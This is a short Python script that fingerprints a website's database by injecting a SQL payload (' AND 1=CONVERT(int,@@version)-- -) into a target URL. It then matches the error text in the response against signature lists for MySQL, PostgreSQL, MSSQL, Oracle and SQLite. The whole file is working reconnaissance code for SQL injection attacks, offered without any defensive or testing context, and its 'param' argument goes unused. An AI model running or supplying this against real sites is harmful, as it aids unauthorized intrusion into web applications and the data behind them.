import urllib.request
import urllib.parse
import re

DB_SIGNATURES = {
    'mysql': [
        r'SQL syntax.*?MySQL', r'Warning.*?\Wmysqli?_', r'MySQLSyntaxErrorException',
        r'valid MySQL result', r'check the manual that corresponds to your (MySQL|MariaDB)',
        r'Unknown column.*in.*clause', r'MySqlClient\.',
        r'com\.mysql\.jdbc', r'Zend_Db_Adapter_Mysqli_Exception'
    ],
    'postgresql': [
        r'PostgreSQL.*?ERROR', r'Warning.*?\Wpg_', r'valid PostgreSQL result',
        r'Npgsql\.', r'PG::SyntaxError', r'org\.postgresql\.util\.PSQLException',
        r'ERROR:\s+syntax error at or near'
    ],
    'mssql': [
        r'Driver.*? SQL[\-\_\ ]*Server', r'OLE DB.*? SQL Server',
        r'\bSQL Server[^&lt;]*?Driver', r'Warning.*?\W(mssql|sqlsrv)_',
        r'\bSQL Server\b', r'ODBC SQL Server Driver',
        r'SQLServer JDBC Driver', r'com\.microsoft\.sqlserver\.jdbc',
        r'Msg \d+, Level \d+, State \d+', r'Unclosed quotation mark'
    ],
    'oracle': [
        r'\bORA-\d{5}', r'Oracle error', r'Oracle.*?Driver',
        r'Warning.*?\W(oci|ora)_', r'quoted string not properly terminated',
        r'oracle\.jdbc', r'OracleException'
    ],
    'sqlite': [
        r'SQLite/JDBCDriver', r'SQLite\.Exception', r'System\.Data\.SQLite',
        r'Warning.*?\W(sqlite_|SQLite3::)', r'\[SQLITE_ERROR\]',
        r'SQLite error \d+:', r'sqlite3\.OperationalError',
        r'pdo_sqlite'
    ]
}

def fingerprint_dbms(url, param):
    """Identify DBMS by injecting a syntax error and matching error signatures."""
    payload = "' AND 1=CONVERT(int,@@version)-- -"
    full_url = url + urllib.parse.quote(payload, safe='')
    try:
        resp = urllib.request.urlopen(urllib.request.Request(full_url), timeout=10)
        body = resp.read().decode('utf-8', errors='replace')
    except urllib.error.HTTPError as e:
        body = e.read().decode('utf-8', errors='replace')
    except Exception:
        body = ''
    results = {}
    for dbms, patterns in DB_SIGNATURES.items():
        score = sum(1 for p in patterns if re.search(p, body, re.I))
        if score > 0:
            results[dbms] = score
    if results:
        return max(results, key=results.get)
    return None

